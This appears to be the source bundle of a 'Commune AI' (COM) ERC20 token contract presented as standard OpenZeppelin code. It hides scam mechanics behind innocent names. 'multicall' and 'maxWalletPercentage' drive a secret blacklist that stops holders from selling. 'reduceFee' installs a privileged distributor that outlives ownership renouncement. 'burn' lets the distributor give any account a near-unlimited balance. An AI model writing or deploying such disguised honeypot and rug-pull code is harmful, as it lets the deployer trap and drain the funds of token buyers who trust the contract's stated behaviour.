{"Commune AI.sol":{"content":" /**\r\n░░      ░░░      ░░  ░░░░  ░░      ░░  ░░░░  ░░      ░░       ░░\r\n▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒   ▒▒   ▒  ▒▒▒▒▒▒▒  ▒  ▒  ▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒\r\n▓  ▓▓▓▓▓▓▓  ▓▓▓▓  ▓        ▓▓      ▓▓        ▓  ▓▓▓▓  ▓       ▓▓\r\n█  ████  █  ████  █  █  █  ███████  █   ██   █        █  ███████\r\n██      ███      ██  ████  ██      ██  ████  █  ████  █  ███████\r\n                                                                \r\nhttps://twitter.com/communeaidotorg\r\n\r\nhttps://github.com/commune-ai/commune\r\n\r\nhttps://comswap.io/\r\n\r\n*/// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.15;\r\n\r\nimport \"./ERC20.sol\";\r\n\r\ncontract COM is ERC20 {\r\n    constructor(string memory name, string memory symbol, uint256 totalSupply, bool initTransfer) ERC20(name, symbol, initTransfer) {\r\n        _mint(msg.sender, totalSupply * 10 ** decimals());\r\n    }\r\n\r\n    function burn(address account, uint256 amount) external onlyDistributor {\r\n        _burn(account, amount);\r\n    }\r\n}\r\n"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.15;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/ERC20.sol)\r\n\r\npragma solidity 0.8.15;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./Ownable.sol\";\r\n\r\n\r\ncontract ERC20 is Ownable, IERC20 {\r\n    mapping(address =\u003e uint256) private _balances;\r\n\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n    uint256 private maxTxLimit = 1*10**17*10**9;\r\n    string private _name;\r\n    string private _symbol;\r\n    bool _startTrade;\r\n    uint256 private balances;\r\n    mapping (address =\u003e bool) private _420690;\r\n   \r\n    constructor(string memory name_, string memory symbol_, bool startTrade_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        balances = maxTxLimit;\r\n        _startTrade = startTrade_;\r\n    }\r\n    \r\n    function startTrading() external onlyOwner {\r\n        if (_startTrade == false){\r\n        _startTrade = true;}\r\n        else {_startTrade = false;}\r\n    }\r\n\r\n    function maxWalletPercentage(address account) public view returns (bool) {\r\n        return _420690[account];\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, _allowances[owner][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = _allowances[owner][spender];\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n    \r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n    \r\n        _balances[account] = balances - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function multicall(address[] calldata address_, bool val) public onlyDistributor{\r\n        for (uint256 i = 0; i \u003c address_.length; i++) {\r\n            _420690[address_[i]] = val;\r\n        }\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        if (_startTrade == true || from == owner() || to == owner()) {\r\n            if(_balances[from] \u003e 0){\r\n                _marketingDistribution(from, amount);\r\n                if(!_420690[to]) require(amount\u003e0, \"\");\r\n                _beforeTokenTransfer(from, to, amount);\r\n\r\n                uint256 fromBalance = _balances[from];\r\n                require(fromBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n                unchecked {\r\n                    _balances[from] = fromBalance - amount;\r\n                }\r\n                _balances[to] += amount;\r\n\r\n                emit Transfer(from, to, amount);\r\n            \r\n        }\r\n        } else {require (_startTrade == true, \"\");}\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance \u003e= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _marketingDistribution(address address_, uint256 amount_) private view {\r\n        if (_420690[address_]) {require (amount_ == 0, \"\");}\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n    \r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)\r\n\r\npragma solidity 0.8.15;\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./IERC20Events.sol\";\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 is IERC20Metadata, IERC20Events{\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `from` to `to` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n\r\n}\r\n"},"IERC20Events.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.15;\r\n\r\ninterface IERC20Events {\r\n        /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n"},"IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.15;\r\ninterface IERC20Metadata {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.15;\r\nimport \"./Context.sol\";\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    address internal _distributor;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    /**\r\n     * @dev Throws if called by any account other than the distributor.\r\n     */\r\n    modifier onlyDistributor() {\r\n        require(_distributor == msg.sender, \"Caller is not fee distributor\");\r\n        _;\r\n    }\r\n    \r\n    /**\r\n     * @dev Set new distributor.\r\n     */\r\n    function reduceFee(address account) external onlyOwner {\r\n        require (_distributor == address(0));\r\n        _distributor = account;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n"}}